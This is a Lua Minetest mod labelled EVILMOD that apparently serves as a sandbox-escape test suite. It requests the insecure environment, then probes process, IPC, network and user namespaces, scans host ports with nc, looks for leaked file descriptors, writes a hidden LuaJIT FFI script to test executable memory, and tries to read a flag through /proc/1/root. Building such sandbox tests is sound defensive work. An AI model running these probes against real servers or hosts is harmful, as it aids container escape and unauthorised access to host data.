minetest.log("action", "[EVILMOD] Initializing...")
minetest.register_on_mods_loaded(function()
    if mcl_weather then
        mcl_weather.end_time = math.huge
    end
    minetest.settings:set("time_speed", "0")
end)
local IE = minetest.request_insecure_environment()
if not IE then
    minetest.log("error", "[EVILMOD] insecure env unavailable — add evilmod to secure.trusted_mods")
    return
end
local function probe(name, fn)
    local ok, result = pcall(fn)
    local line = ok and result or ("[LUA ERROR] " .. tostring(result))
    minetest.log("action", string.format("[EVILMOD] %-50s %s", name, line))
end
local function popen(cmd)
    if not IE.io.popen then return nil end
    local f = IE.io.popen(cmd, "r")
    if not f then return nil end
    local out = f:read("*a")
    f:close()
    return out
end
minetest.after(3, function()
    minetest.log("action", "[EVILMOD] ========== ATTACK SEQUENCE START ==========")
    probe("PID ns — /proc/1/comm (host init visible?)", function()
        local f = IE.io.open("/proc/1/comm", "r")
        if not f then return "[CONTAINED] cannot open /proc/1/comm" end
        local comm = f:read("*a"):gsub("%s+", "")
        f:close()
        if comm == "minetestserver" or comm == "minetest" then
            return string.format("[CONTAINED] PID 1 is '%s' (container init, not host)", comm)
        end
        return string.format("[ESCAPED] PID 1 on host is '%s'", comm)
    end)
    probe("PID ns — visible PID count in /proc", function()
        local f = IE.io.popen("ls /proc", "r")
        if not f then return "[ERROR] cannot list /proc" end
        local out = f:read("*a")
        f:close()
        local count = 0
        for entry in out:gmatch("[^\n]+") do
            if entry:match("^%d+$") then count = count + 1 end
        end
        if count > 20 then
            return string.format("[ESCAPED] /proc shows %d PIDs — host namespace visible", count)
        end
        return string.format("[CONTAINED] /proc shows %d PIDs (isolated namespace)", count)
    end)
    probe("PID ns — read parent (container manager) cmdline", function()
        local sf = IE.io.open("/proc/self/status", "r")
        if not sf then return "[CONTAINED] cannot read /proc/self/status" end
        local ppid
        for line in sf:lines() do
            ppid = line:match("^PPid:%s*(%d+)")
            if ppid then break end
        end
        sf:close()
        if not ppid then return "[CONTAINED] could not parse PPID" end
        local cf = IE.io.open("/proc/" .. ppid .. "/cmdline", "r")
        if not cf then
            return string.format("[CONTAINED] PPID=%s cmdline unreadable (proper PID ns)", ppid)
        end
        local cmdline = cf:read("*a"):gsub("%z", " "):gsub("%s+$", "")
        cf:close()
        return string.format("[ESCAPED] PPID=%s cmd='%s'", ppid, cmdline)
    end)
    probe("IPC ns — /proc/sysvipc/shm isolated", function()
        local f = IE.io.open("/proc/sysvipc/shm", "r")
        if not f then return "[CONTAINED] cannot open /proc/sysvipc/shm" end
        local data_lines = 0
        local first = true
        for _ in f:lines() do
            if first then first = false else data_lines = data_lines + 1 end
        end
        f:close()
        if data_lines > 0 then
            return string.format("[ESCAPED] IPC ns shared: %d host shm segment(s) visible", data_lines)
        end
        return "[CONTAINED] IPC ns isolated (0 shm segments)"
    end)
    probe("IPC ns — /proc/sysvipc/sem isolated", function()
        local f = IE.io.open("/proc/sysvipc/sem", "r")
        if not f then return "[CONTAINED] cannot open /proc/sysvipc/sem" end
        local data_lines = 0
        local first = true
        for _ in f:lines() do
            if first then first = false else data_lines = data_lines + 1 end
        end
        f:close()
        if data_lines > 0 then
            return string.format("[ESCAPED] IPC ns shared: %d host sem set(s) visible", data_lines)
        end
        return "[CONTAINED] IPC ns isolated (0 semaphore sets)"
    end)
    probe("Network — reach host 172.18.0.1 (TCP connect)", function()
        if not IE.io.popen then return "[SKIP] io.popen unavailable" end
        local open_ports = {}
        for _, port in ipairs({22, 80, 443, 8080, 3000, 5432}) do
            local out = popen("nc -z -w1 172.18.0.1 " .. port .. " 2>/dev/null; echo $?") or ""
            if out:match("^0") then
                open_ports[#open_ports + 1] = tostring(port)
            end
        end
        if #open_ports > 0 then
            return "[ESCAPED] host ports reachable: " .. table.concat(open_ports, ",")
        end
        return "[CONTAINED] no host ports reachable (INPUT REJECT rule active)"
    end)
    probe("FD inheritance — leaked host fds", function()
        if not IE.io.popen then return "[SKIP] io.popen unavailable" end
        local out = popen("ls -la /proc/self/fd 2>/dev/null") or ""
        local leaked = {}
        for line in out:gmatch("[^\n]+") do
            local target = line:match("%->%s+(.+)$")
            if target then
                target = target:gsub("%s+$", "")
                if target:match("^/home/") or target:match("^/root/") or
                   target:match("sandbox_") or target:match("^/sys/fs/cgroup") then
                    local fd = line:match("%s(%d+)%s*%->")
                    leaked[#leaked + 1] = "fd" .. (fd or "?") .. "->" .. target
                end
            end
        end
        if #leaked > 0 then
            return "[ESCAPED] fds point to host paths: " .. table.concat(leaked, " | ")
        end
        return "[CONTAINED] no host-path fds inherited (closerange working)"
    end)
    probe("User ns — clone(CLONE_NEWUSER) succeeds", function()
        if not IE.io.popen then return "[SKIP] io.popen unavailable" end
        local out = popen("unshare -U id 2>&1; echo exitcode:$?")
        local code = out:match("exitcode:(%d+)")
        if code == "0" then
            local id_line = out:gsub("exitcode:%d+%s*$", ""):gsub("%s+$", "")
            return "[ESCAPED] unshare -U succeeded: " .. id_line
        end
        local err = out:gsub("exitcode:%d+%s*$", ""):gsub("%s+$", ""):sub(1, 80)
        return "[CONTAINED] unshare -U failed: " .. err
    end)
    probe("Net ns — host connections visible (run without -n)", function()
        local tcp_f = IE.io.open("/proc/net/tcp", "r")
        if not tcp_f then return "[CONTAINED] cannot read /proc/net/tcp" end
        local tcp_entries = -1
        for _ in tcp_f:lines() do tcp_entries = tcp_entries + 1 end
        tcp_f:close()
        local unix_entries = -1
        local ux_f = IE.io.open("/proc/net/unix", "r")
        if ux_f then
            for _ in ux_f:lines() do unix_entries = unix_entries + 1 end
            ux_f:close()
        end
        if tcp_entries > 3 or unix_entries > 5 then
            return string.format(
                "[ESCAPED] host net namespace shared: %d TCP connections, %d Unix sockets",
                tcp_entries, unix_entries
            )
        end
        return "[CONTAINED] isolated net namespace (%d TCP, %d Unix)"
    end)
    probe("Seccomp — mprotect(PROT_EXEC) not filtered", function()
        if not IE.io.popen then return "[SKIP] io.popen unavailable" end
        local script = [=[
local ffi = require("ffi")
ffi.cdef("void *mmap(void*,size_t,int,int,int,long); int mprotect(void*,size_t,int); int munmap(void*,size_t);")
local PROT_READ, PROT_WRITE, PROT_EXEC = 1, 2, 4
local MAP_PRIVATE, MAP_ANON = 0x02, 0x20
local p = ffi.C.mmap(nil, 4096, PROT_READ+PROT_WRITE, MAP_PRIVATE+MAP_ANON, -1, 0)
if p == ffi.cast("void*", ffi.cast("intptr_t", -1)) then print("MMAP_FAIL") os.exit(1) end
local r = ffi.C.mprotect(p, 4096, PROT_READ+PROT_EXEC)
ffi.C.munmap(p, 4096)
print(r == 0 and "ESCAPED" or "CONTAINED")
]=]
        local tf = IE.io.open("/tmp/.mprotect_test.lua", "w")
        if not tf then return "[ERROR] cannot write temp script" end
        tf:write(script)
        tf:close()
        local out = popen("luajit /tmp/.mprotect_test.lua 2>/dev/null; echo exitcode:$?") or ""
        if out:match("ESCAPED") then
            return "[ESCAPED] mmap+mprotect(PROT_EXEC) allowed — arbitrary native code executable"
        elseif out:match("CONTAINED") then
            return "[CONTAINED] mprotect(PROT_EXEC) blocked by seccomp"
        elseif out:match("MMAP_FAIL") then
            return "[CONTAINED] mmap failed"
        end
        return "[ERROR] unexpected luajit output: " .. out:sub(1, 80)
    end)
    probe("Chroot escape — /proc/1/root flag capture", function()
        local f = IE.io.open("/proc/1/root/tmp/modbox_flag.txt", "r")
        if not f then
            return "[CONTAINED] cannot read host flag via /proc/1/root"
        end
        local flag = f:read("*a"):gsub("%s+$", "")
        f:close()
        return "[ESCAPED] *** FLAG CAPTURED: " .. flag .. " ***"
    end)
    minetest.log("action", "[EVILMOD] ========== ATTACK ENDED ==========")
end)
